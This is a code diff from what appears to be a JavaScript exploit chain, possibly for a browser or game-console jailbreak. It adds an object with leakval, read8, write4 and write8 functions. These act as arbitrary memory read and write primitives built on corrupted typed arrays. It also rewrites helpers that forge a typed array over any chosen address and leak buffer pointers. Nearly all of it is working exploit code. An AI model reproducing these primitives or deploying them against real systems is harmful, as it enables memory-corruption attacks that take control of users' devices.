@@ -31,27 +31,57 @@ import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
 
+var p = {
+  leakval: function (obj) {
+    obj_slave.obj = obj;
+    return new int64(obj_master[4], obj_master[5]);
+  },
+  write8: function (addr, value) {
+    expl_master[4] = addr.low;
+    expl_master[5] = addr.hi;
+    if (value instanceof int64) {
+      expl_slave[0] = value.low;
+      expl_slave[1] = value.hi;
+    } else {
+      expl_slave[0] = value;
+      expl_slave[1] = 0;
+    }
+  },
+  write4: function (addr, value) {
+    expl_master[4] = addr.low;
+    expl_master[5] = addr.hi;
+    if (value instanceof int64) {
+      expl_slave[0] = value.low;
+    } else {
+      expl_slave[0] = value;
+    }
+  },
+  read8: function (addr) {
+    expl_master[4] = addr.low;
+    expl_master[5] = addr.hi;
+    return new int64(expl_slave[0], expl_slave[1]);
+  }
+};
+
 function array_from_address(addr, size) {
-    let view = new Uint32Array(0x1000);
-    let vec_addr = mt.get_view_vector(view); // otteniamo l'indirizzo del buffer
-    vec_addr.writePtr(addr);                 // view.buffer = addr
-    vec_addr.add(8).write32(size);           // view.length = size
-    vec_addr.add(0xC).write32(1);            // view.mode = WastefulTypedArray
+        var og_array = new Uint32Array(0x1000);
+        var og_array_i = p.leakval(og_array).add32(0x10);
 
-    nogc.push(view);
-    return view;
-}
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(0x8), size);
+        p.write4(og_array_i.add32(0xC), 0x1);
 
-function malloc(size) {
-    let backing = new Uint8Array(0x10000 + size);
-    nogc.push(backing);
+        nogc.push(og_array);
+        return og_array;
+    }
 
-    let vec_addr = mt.get_view_vector(backing);
-    let addr = vec_addr.readPtr();
-    addr.backing = backing;
-
-    return addr;
-}
+   function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
 
 import {
     View1, View2, View4,
